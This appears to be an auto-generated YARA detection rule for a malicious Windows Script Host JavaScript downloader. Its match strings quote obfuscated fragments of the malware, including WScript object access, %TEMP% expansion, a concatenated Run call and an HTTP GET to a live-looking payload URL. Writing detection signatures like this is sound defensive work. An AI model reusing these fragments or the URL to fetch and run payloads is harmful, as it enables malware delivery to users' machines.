rule sig_20160428_b4517a9f250f35815e5f4163fc6e8046 {
  meta:
    description = "datamaliciousorder - file 20160428_b4517a9f250f35815e5f4163fc6e8046.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2a56bb3d1f9faf8951e2e95a7f3caffe79527457aeee2114caf793d68578dc3b"

  strings:
    $s1  = "function EcnYusKkmEfoGjhUmhRpq(QuvHmzWxgOabMkoCrfEss){IbqMphUnaTesGpfYosQwe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function FxuYwrJkhFibQwoRfzLau() {return IbqMphUnaTesGpfYosQwe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function EcnYusKkmEfoGjhUmhRpq(QuvHmzWxgOabMkoCrfEss){IbqMphUnaTesGpfYosQwe[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var IbqMphUnaTesGpfYosQwe = function UqaWqeStgRjzTlqQwiCsx() {return LpnQhkPdmXpfZvnSesQbv[WdyNodPngSqbUuiRtkDcn](\"WScript\"+\"" ascii
    $s5  = "function AbuOtiDiuRkvUdhCduKtg() {return ((ObwCuoVogIghWfyXvyXos == true) && (ObwCuoVogIghWfyXvyXos == TmlOgkOaeIxxBzaQtrTuc)) ?" ascii
    $s6  = "function SkmWvzNheYsgTdnSdkMgu(TuwExyIemIkkZlpNxsFeo, WhuEtsUkfTqpHsrTayPxz){AjaAenEgeJymIzaUktAdq = AjaAenEgeJymIzaUktAdq * 1; " ascii
    $s7  = "return TuwExyIemIkkZlpNxsFeo - WhuEtsUkfTqpHsrTayPxz;};" fullword ascii
    $s8  = "function AbuOtiDiuRkvUdhCduKtg() {return ((ObwCuoVogIghWfyXvyXos == true) && (ObwCuoVogIghWfyXvyXos == TmlOgkOaeIxxBzaQtrTuc)) ?" ascii
    $s9  = "OkfAmgXrlVhiAicVocPkp[XxsYolRlyQovRhqUdeBny](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s10 = "var IbqMphUnaTesGpfYosQwe = function UqaWqeStgRjzTlqQwiCsx() {return LpnQhkPdmXpfZvnSesQbv[WdyNodPngSqbUuiRtkDcn](\"WScript\"+\"" ascii
    $s11 = "var LpnQhkPdmXpfZvnSesQbv = this[\"WScript\"];" fullword ascii
    $s12 = "function FxuYwrJkhFibQwoRfzLau() {return IbqMphUnaTesGpfYosQwe[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "var TmlOgkOaeIxxBzaQtrTuc = false;" fullword ascii
    $s14 = "TmlOgkOaeIxxBzaQtrTuc = true; " fullword ascii
    $s15 = "if (OkfAmgXrlVhiAicVocPkp[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s16 = "function SkmWvzNheYsgTdnSdkMgu(TuwExyIemIkkZlpNxsFeo, WhuEtsUkfTqpHsrTayPxz){AjaAenEgeJymIzaUktAdq = AjaAenEgeJymIzaUktAdq * 1; " ascii
    $s17 = "function PcyIcmSalLzkXjqLcqOwi(){return EjpNhjScjHccOcxHytMgg + \"\";};" fullword ascii
    $s18 = "function DxrCnfRneVadFddXcfMxk(RtdJqsOjhQygCbjImrUxh) {var KdpHxdOesYkpOinXftByh = (1, 2, 3, 4, 5, RtdJqsOjhQygCbjImrUxh); retur" ascii
    $s19 = "function QfmGufXweNbdRslZquGtq(){return 23;};" fullword ascii
    $s20 = "function XndXypUduQykJuqXxxMyf(){return WdyNodPngSqbUuiRtkDcn;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}